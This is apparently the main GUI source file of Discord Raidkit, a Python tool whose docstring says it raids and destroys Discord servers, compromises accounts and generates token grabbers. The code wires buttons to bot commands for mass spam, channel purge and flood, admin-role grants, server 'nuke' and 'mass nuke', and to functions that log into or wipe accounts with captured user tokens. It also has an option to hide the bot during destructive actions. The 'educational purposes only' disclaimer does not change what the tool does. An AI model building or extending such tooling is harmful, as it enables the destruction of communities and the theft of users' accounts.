"""
Discord Raidkit v2.5.2 by the-cult-of-integral

An open-source, forever free tool that allows you to raid and destroy 
Discord servers via Discord bots,  compromise Discord accounts, and 
generate Discord token grabbers. 

Please submit any issues you encounter to the GitHub repository at:
https://github.com/the-cult-of-integral/discord-raidkit/issues/

This helps me stay on track with maintaining the project and fixing bugs!

This project is for educational purposes only. I am not responsible for
any damage caused by this tool. By using this tool for non-educational
For this reason, you accept responsibility for any action caused. 

Use at your own risk.
"""

import os
import time
import sys
import webbrowser

from PyQt6 import QtCore, QtWidgets, QtGui
from qt.MainWindow import Ui_MainWindow
from qt.NewBotStatus import Ui_dlgNewBotStatus
from qt.NewBotPresenceStatus import Ui_DlgNewBotPresenceStatus
from qt.InvokeNickAllArgs import Ui_dlgInvokeNickAllArgs
from qt.InvokeMsgAllArgs import Ui_dlgInvokeMsgAllArgs
from qt.InvokeSpamArgs import Ui_dlgInvokeSpamArgs
from qt.InvokeNewWebhookArgs import Ui_dlgInvokeNewWebhookArgs
from qt.InvokeCPurge import Ui_dlgInvokeCPurge
from qt.InvokeCFloodArgs import Ui_dlgInvokeCFloodArgs
from qt.InvokeAdminArgs import Ui_dlgInvokeAdminArgs
from qt.InvokeRaidArgs import Ui_dlgInvokeRaidArgs
from qt.InvokeNukeArgs import Ui_dlgInvokeNukeArgs
from qt.InvokeMassNukeArgs import Ui_dlgInvokeMassNukeArgs
from qt.InvokeLeave import Ui_dlgInvokeLeave
from qt.InvokeMassLeave import Ui_dlgInvokeMassLeave
from qt.LoginBrowser import Ui_DlgLoginBrowser
from qt.HorusClosedMsg import Ui_dlgHorusClosedMsg
from qt.LatestVersionCheck import Ui_dlgLatestVersionCheck

from horus.horus_thread import HorusThread
from horus.horus_raiders import Anubis, Qetesh
from osiris.osiris_thread import OsirisThread
from shared.dr.dr_config import DRConfig, CONFIG_PATH
from shared.dr.dr_types import ED_Statuses, EH_Raiders, EH_HiddenCommands, EO_Commands, EO_Browsers
from shared.utils.utils_log import init
from shared.utils.utils_repo import latest_version_info


class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
    def __init__(self, config: DRConfig, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
        self.setupUi(self)

        self.config = config
        self.load_config_into_ui()

        self.horus_thread = HorusThread(self.config, None)
        self.horus_thread.signal_update_status.connect(self.update_status)
        self.horus_thread.signal_append_hterminal.connect(self.append_hterminal)
        self.horus_thread.signal_refresh_running_commands_view.connect(self.refresh_running_commands_view)
        self.horus_thread.signal_bot_is_online.connect(self.bot_is_online)
        self.horus_thread.signal_attempting_run.connect(self.bot_attempting_run)
        self.horus_thread.signal_bot_has_been_run.connect(self.bot_has_been_run)

        self.osiris_thread = OsirisThread(self.config)
        self.osiris_thread.signal_append_oterminal.connect(self.append_oterminal)
        self.osiris_thread.signal_refresh_running_commands_view.connect(self.o_refresh_running_commands_view)

        self.osiris_thread.signal_spy_running.connect(self.btnOGetAccountInfo.setDisabled)
        self.osiris_thread.signal_spy_running.connect(lambda: self.set_osiris_token())
        
        self.osiris_thread.signal_login_running.connect(self.btnOLogin.setDisabled)
        self.osiris_thread.signal_login_running.connect(self.btnOLoginNoSelenium.setDisabled)
        self.osiris_thread.signal_login_running.connect(lambda: self.set_osiris_token())

        self.osiris_thread.signal_nuke_running.connect(self.btnONuke.setDisabled)
        self.osiris_thread.signal_nuke_running.connect(lambda: self.set_osiris_token())
        
        self.btnSaveBotConfig.clicked.connect(self.save_bot_config)

        self.tbtnAddStatus.clicked.connect(self.add_bot_status)
        self.tbtnDelStatus.clicked.connect(self.del_bot_status)
        self.tbtnClearCommandTerminal.clicked.connect(self.pteHTerminal.clear)
        self.tbtnOClearCommandTerminal.clicked.connect(self.pteOTerminal.clear)
        self.btnChangeStatus.clicked.connect(self.change_hpresence_status)

        self.btnStartHorus.clicked.connect(self.start_horus)
        self.btnStopHorus.clicked.connect(self.stop_horus)
        self.btnCancelHCmd.clicked.connect(self.cancel_hcommand)

        self.btnInvokeNickAll.clicked.connect(self.horus_invoke_nick_all)
        self.btnInvokeMsgAll.clicked.connect(self.horus_invoke_msg_all)
        self.btnInvokeSpam.clicked.connect(self.horus_invoke_spam)
        self.btnInvokeNewWebhook.clicked.connect(self.horus_invoke_new_webhook)
        self.btnInvokeCPurge.clicked.connect(self.horus_invoke_cpurge)
        self.btnInvokeCFlood.clicked.connect(self.horus_invoke_cflood)
        self.btnInvokeAdmin.clicked.connect(self.horus_invoke_admin)
        self.btnInvokeRaid.clicked.connect(self.horus_invoke_raid)
        self.btnInvokeNuke.clicked.connect(self.horus_invoke_nuke)
        self.btnInvokeMassNuke.clicked.connect(self.horus_invoke_mass_nuke)
        self.btnInvokeLeave.clicked.connect(self.horus_invoke_leave)
        self.btnInvokeMassLeave.clicked.connect(self.horus_invoke_mass_leave)

        self.btnOGetAccountInfo.clicked.connect(lambda: self.osiris_thread.invoke_command(EO_Commands.SPY.value, thread=self.osiris_thread, auth_token=self.leUserToken.text()))
        self.btnOLogin.clicked.connect(self.osiris_invoke_login)
        self.btnOLoginNoSelenium.clicked.connect(self.osiris_invoke_login_no_selenium)
        self.btnONuke.clicked.connect(self.osiris_invoke_nuke)
        
        self.mbMenuBar.triggered.connect(self.menu_action_triggered)

        self.btnStopHorus.setEnabled(False)
        self.btnCancelHCmd.setEnabled(False)
        self.btnChangeStatus.setEnabled(False)
        self.btnInvokeNickAll.setEnabled(False)
        self.btnInvokeMsgAll.setEnabled(False)
        self.btnInvokeSpam.setEnabled(False)
        self.btnInvokeNewWebhook.setEnabled(False)
        self.btnInvokeCPurge.setEnabled(False)
        self.btnInvokeCFlood.setEnabled(False)
        self.btnInvokeAdmin.setEnabled(False)
        self.btnInvokeRaid.setEnabled(False)
        self.btnInvokeNuke.setEnabled(False)
        self.btnInvokeMassNuke.setEnabled(False)
        self.btnInvokeLeave.setEnabled(False)
        self.btnInvokeMassLeave.setEnabled(False)

        self.osiris_thread.start()

        if self.config.application.do_startup_version_check:
            self.act_latest_version()
    
    def set_osiris_token(self):
            self.config.osiris.token = self.leUserToken.text()
            self.config.save_to_file(CONFIG_PATH)



    # Menu Actions.

    def menu_action_triggered(self, action: QtGui.QAction):
        match action.objectName():
            case 'actWiki': self.act_wiki()
            case 'actLatestVersion': self.act_latest_version()
            case 'actREADME': self.act_readme()
            case 'actReportIssue': self.act_report_issue()

    def act_wiki(self):
        webbrowser.open('https://github.com/the-cult-of-integral/discord-raidkit/wiki')

    def act_latest_version(self):
        lvi = latest_version_info()
        if lvi[0]:
            self.update_status(f'You are running the latest version of Discord Raidkit.')
            return
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgLatestVersionCheck()
        dialog_ui.setupUi(dialog)
        dialog_ui.rdNothing.setChecked(True)
        dialog_ui.chkDoNotShowThisMessageOnStartUpAgain.setChecked(not self.config.application.do_startup_version_check)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            self.config.application.do_startup_version_check = not dialog_ui.chkDoNotShowThisMessageOnStartUpAgain.isChecked()
            self.config.save_to_file(CONFIG_PATH)
            if dialog_ui.rdNothing.isChecked():
                return
            elif dialog_ui.rdOpen.isChecked():
                webbrowser.open(lvi[1])
            elif dialog_ui.rdOpenAndExit.isChecked():
                webbrowser.open(lvi[1])
                if self.horus_thread.isRunning():
                    self.horus_thread.cancel_all_running_commands()
                    self.horus_thread.stop_horus()
                sys.exit(0)

    def act_readme(self):
        webbrowser.open('https://github.com/the-cult-of-integral/discord-raidkit/')

    def act_report_issue(self):
        webbrowser.open('https://github.com/the-cult-of-integral/discord-raidkit/issues')

    # Osiris Invokation Commands.

    def osiris_invoke_nuke(self):
        self.osiris_thread.invoke_command(EO_Commands.NUKE.value, thread=self.osiris_thread, auth_token=self.leUserToken.text())

    def osiris_invoke_login(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_DlgLoginBrowser()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            if dialog_ui.rdChrome.isChecked():
                browser = EO_Browsers.CHROME.value
            elif dialog_ui.rdFirefox.isChecked():
                browser = EO_Browsers.FIREFOX.value
            elif dialog_ui.rdEdge.isChecked():
                browser = EO_Browsers.EDGE.value
            else:
                self.append_oterminal('Error: No Browser Selected.')
                return
            
            self.osiris_thread.invoke_command(EO_Commands.LOGIN.value, thread=self.osiris_thread, browser=browser, auth_token=self.leUserToken.text())

    def osiris_invoke_login_no_selenium(self):
        self.osiris_thread.invoke_command(EO_Commands.LOGIN.value, thread=self.osiris_thread, browser=None, auth_token=self.leUserToken.text())

    # Osiris Signal Methods.

    def append_oterminal(self, text: str):
        time_str = time.strftime("%H:%M:%S", time.localtime())
        self.pteOTerminal.appendPlainText(time_str + ' - ' + text + '\n')
    
    def o_refresh_running_commands_view(self, _: int):
        self.pteORunningCommands.clear()
        for command in self.osiris_thread.running_commands_names:
            self.pteORunningCommands.appendPlainText(command)

    # Horus Invokation Commands.

    def __convert_to_int(self, value: str, error_msg: str) -> int | bool:
        """Tries to convert the given value to an integer. If it fails, 
        it appends the error message to the Horus terminal.
        """
        try:
            return int(value)
        except ValueError:
            self.append_hterminal(error_msg)
            return False

    def horus_invoke_nick_all(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeNickAllArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            nickname = dialog_ui.leNickname.text().strip()
            if nickname:
                self.horus_thread.invoke_command(EH_HiddenCommands.NICK_ALL.value, guild_id=guild_id, nickname=nickname)
            else:
                self.append_hterminal('Error: Invalid Nickname Provided.')

    def horus_invoke_msg_all(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeMsgAllArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            message = dialog_ui.leMessage.text().strip()
            if message:
                self.horus_thread.invoke_command(EH_HiddenCommands.MSG_ALL.value, guild_id=guild_id, message=message)
            else:
                self.append_hterminal('Error: Invalid Message Provided.')

    def horus_invoke_spam(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeSpamArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            message = dialog_ui.leMessage.text().strip()
            if message:
                self.horus_thread.invoke_command(EH_HiddenCommands.SPAM.value, guild_id=guild_id, message=message)
            else:
                self.append_hterminal('Error: Invalid Message Provided.')

    def horus_invoke_new_webhook(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeNewWebhookArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            channel_id = self.__convert_to_int(dialog_ui.leChannelID.text().strip(), 'Error: Invalid Channel ID Provided.')
            if not channel_id:
                return
            name = dialog_ui.leName.text().strip()
            if name:
                self.horus_thread.invoke_command(EH_HiddenCommands.NEW_WEBHOOK.value, guild_id=guild_id, channel_id=channel_id, name=name)
            else:
                self.append_hterminal('Error: Invalid Name Provided.')

    def horus_invoke_cpurge(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeCPurge()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            self.horus_thread.invoke_command(EH_HiddenCommands.CPURGE.value, guild_id=guild_id)

    def horus_invoke_cflood(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeCFloodArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            amount = dialog_ui.sbAmount.value()
            name = dialog_ui.leName.text().strip()
            if name:
                self.horus_thread.invoke_command(EH_HiddenCommands.CFLOOD.value, guild_id=guild_id, amount=amount, name=name)
            else:
                self.append_hterminal('Error: Invalid Name Provided.')

    def horus_invoke_admin(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeAdminArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            member_id = self.__convert_to_int(dialog_ui.leMemberID.text().strip(), 'Error: Invalid Member ID Provided.')
            if not member_id:
                return
            role_name = dialog_ui.leName.text().strip()
            if role_name:
                self.horus_thread.invoke_command(EH_HiddenCommands.ADMIN.value, guild_id=guild_id, member_id=member_id, role_name=role_name)
            else:
                self.append_hterminal('Error: Invalid Role Name Provided.')

    def horus_invoke_raid(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeRaidArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            role_name = dialog_ui.leRoleName.text().strip()
            nickname = dialog_ui.leNickname.text().strip()
            amount = dialog_ui.sbAmount.value()
            name = dialog_ui.leChannelName.text().strip()
            message = dialog_ui.leMessage.text().strip()
            if role_name:
                if nickname:
                    if name:
                        if message:
                            self.horus_thread.invoke_command(EH_HiddenCommands.RAID.value, guild_id=guild_id, role_name=role_name, nickname=nickname, amount=amount, name=name, message=message)
                        else:
                            self.append_hterminal('Error: Invalid Message Provided.')
                    else:
                        self.append_hterminal('Error: Invalid Channel Name Provided.')
                else:
                    self.append_hterminal('Error: Invalid Nickname Provided.')
            else:
                self.append_hterminal('Error: Invalid Role Name Provided.')
    
    def horus_invoke_nuke(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeNukeArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            try:
                excluded_member_id = int(dialog_ui.leMemberID.text().strip())
            except ValueError:
                excluded_member_id = None
            self.horus_thread.invoke_command(EH_HiddenCommands.NUKE.value, guild_id=guild_id, excluded_member_id=excluded_member_id)

    def horus_invoke_mass_nuke(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeMassNukeArgs()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            try:
                excluded_member_id = int(dialog_ui.leMemberID.text().strip())
            except ValueError:
                excluded_member_id = None

            self.horus_thread.invoke_command(EH_HiddenCommands.MASS_NUKE.value, excluded_member_id=excluded_member_id)

    def horus_invoke_leave(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeLeave()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
            if not guild_id:
                return
            self.horus_thread.invoke_command(EH_HiddenCommands.LEAVE.value, guild_id=guild_id)

    def horus_invoke_mass_leave(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgInvokeMassLeave()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            self.horus_thread.invoke_command(EH_HiddenCommands.MASS_LEAVE.value)


    # Horus Signal Methods.

    def update_status(self, status: str):
        self.stsbStatusBar.showMessage(status)

    def append_hterminal(self, text: str):
        time_str = time.strftime("%H:%M:%S", time.localtime())
        self.pteHTerminal.appendPlainText(time_str + ' - ' + text + '\n')

    def refresh_running_commands_view(self, _: int):
        self.pteRunningCommandsView.clear()
        for command in self.horus_thread.bot.running_commands_names:
            self.pteRunningCommandsView.appendPlainText(command)

    def bot_attempting_run(self, b: bool):
        """b is always False, but is required for the signal."""
        self.btnStartHorus.setEnabled(b)
        self.btnSaveBotConfig.setEnabled(b)

    def bot_is_online(self, is_online: bool):
        self.btnStartHorus.setEnabled(not is_online)
        self.btnStopHorus.setEnabled(is_online)
        self.btnCancelHCmd.setEnabled(is_online)
        self.btnChangeStatus.setEnabled(is_online)
        self.btnInvokeNickAll.setEnabled(is_online)
        self.btnInvokeMsgAll.setEnabled(is_online)
        self.btnInvokeSpam.setEnabled(is_online)
        self.btnInvokeNewWebhook.setEnabled(is_online)
        self.btnInvokeCPurge.setEnabled(is_online)
        self.btnInvokeCFlood.setEnabled(is_online)
        self.btnInvokeAdmin.setEnabled(is_online)
        self.btnInvokeRaid.setEnabled(is_online)
        self.btnInvokeNuke.setEnabled(is_online)
        self.btnInvokeMassNuke.setEnabled(is_online)
        self.btnInvokeLeave.setEnabled(is_online)
        self.btnInvokeMassLeave.setEnabled(is_online)
        self.btnSaveBotConfig.setEnabled(not is_online)

    def bot_has_been_run(self, b: bool):
        self.btnStartHorus.setEnabled(not b)
        self.btnStopHorus.setEnabled(not b)

        if not self.config.application.do_not_show_horus_close_message:
            dialog = QtWidgets.QDialog()
            dialog_ui = Ui_dlgHorusClosedMsg()
            dialog_ui.setupUi(dialog)
            if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
                self.config.application.do_not_show_horus_close_message = dialog_ui.chkDoNotShowHorusClosedAgain.isChecked()
                self.config.save_to_file(CONFIG_PATH)
        return

    # Horus Control Methods.

    def start_horus(self):
        if not self.horus_thread.isRunning():
            self.update_status('Attempting to start Horus...')
            match self.config.horus.raider_type:
                case EH_Raiders.ANUBIS.value:
                    self.horus_thread.raider_type = Anubis()
                case EH_Raiders.QETESH.value:
                    self.horus_thread.raider_type = Qetesh()
                case _:
                    self.update_status('Invalid raider type in configuration.')
                    return
            self.horus_thread.start()

    def stop_horus(self):
        self.update_status('Attempting to stop Horus...')
        self.horus_thread.stop_horus()

    def cancel_hcommand(self):
        self.horus_thread.cancel_all_running_commands()

    def change_hpresence_status(self):
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_DlgNewBotPresenceStatus()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            if dialog_ui.rdOnline.isChecked():
                presence = ED_Statuses.ONLINE.value
            elif dialog_ui.rdIdle.isChecked():
                presence = ED_Statuses.IDLE.value
            elif dialog_ui.rdDnd.isChecked():
                presence = ED_Statuses.DND.value
            elif dialog_ui.rdInvisible.isChecked():
                presence = ED_Statuses.INVISIBLE.value
            else:
                self.append_hterminal('Error: Invalid Presence Status Provided.')
                return
            
            status = dialog_ui.leStatus.text().strip()
            self.horus_thread.change_presence_status(presence, status)

            
    # Configuration Methods.

    def load_config_into_ui(self):
        """Loads the configuration into the UI elements.
        """
        self.leBotToken.setText(self.config.horus.token)
        self.leApplicationID.setText(self.config.horus.application_id)
        self.leBotPrefix.setText(self.config.horus.prefix)
        self.leActivityName.setText(self.config.horus.initial_presence.activity_name)
        self.leActivityURL.setText(self.config.horus.initial_presence.activity_url)
        self.cmbActivityType.setCurrentIndex(self.config.horus.initial_presence.activity_type)
        self.cmbPresenceStatus.setCurrentIndex(self.config.horus.initial_presence.status_type)

        if len(self.config.horus.statuses) > 0:
            self.lstwBotStatuses.addItems(self.config.horus.statuses)
        
        self.chkBotInvisibleOnDestructiveActions.setChecked(self.config.horus.auto_invisible_on_malicious_action)
        self.cmbRaiderType.setCurrentIndex(self.config.horus.raider_type)

        self.leUserToken.setText(self.config.osiris.token)

    def save_bot_config(self):
        """Saves the bot configuration from the UI elements.
        """
        self.config.horus.token = self.leBotToken.text()
        self.config.horus.application_id = self.leApplicationID.text()
        self.config.horus.prefix = self.leBotPrefix.text()
        self.config.horus.initial_presence.activity_name = self.leActivityName.text()
        self.config.horus.initial_presence.activity_url = self.leActivityURL.text()
        self.config.horus.initial_presence.activity_type = self.cmbActivityType.currentIndex()
        self.config.horus.initial_presence.status_type = self.cmbPresenceStatus.currentIndex()

        self.config.horus.statuses = [self.lstwBotStatuses.item(i).text() for i in range(self.lstwBotStatuses.count())]
        self.config.horus.auto_invisible_on_malicious_action = self.chkBotInvisibleOnDestructiveActions.isChecked()
        self.config.horus.raider_type = self.cmbRaiderType.currentIndex()

        self.config.save_to_file(CONFIG_PATH)
        QtWidgets.QMessageBox.information(self, "Bot Configuration", "Bot configuration saved successfully.")

    def add_bot_status(self):
        """Adds a new bot status to the list widget and config.
        """
        dialog = QtWidgets.QDialog()
        dialog_ui = Ui_dlgNewBotStatus()
        dialog_ui.setupUi(dialog)
        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            new_status = dialog_ui.leNewBotStatus.text().strip()
            if new_status:
                self.lstwBotStatuses.addItem(new_status)
                self.config.horus.statuses.append(new_status)

    def del_bot_status(self):
        """Deletes the selected bot status from the list widget and config.
        """
        current_item = self.lstwBotStatuses.currentItem()
        if current_item:
            status = current_item.text()
            self.lstwBotStatuses.takeItem(self.lstwBotStatuses.row(current_item))
            if status in self.config.horus.statuses:
                self.config.horus.statuses.remove(status)


if __name__ == '__main__':
    init()
    app = QtWidgets.QApplication(sys.argv)
    app.setWindowIcon(QtGui.QIcon('./_internal/qt/icons/main.ico'))
    config = DRConfig(CONFIG_PATH)
    mainWindow = MainWindow(config)
    mainWindow.setWindowIcon(QtGui.QIcon('./_internal/qt/icons/main.ico'))
    mainWindow.show()
    sys.exit(app.exec())
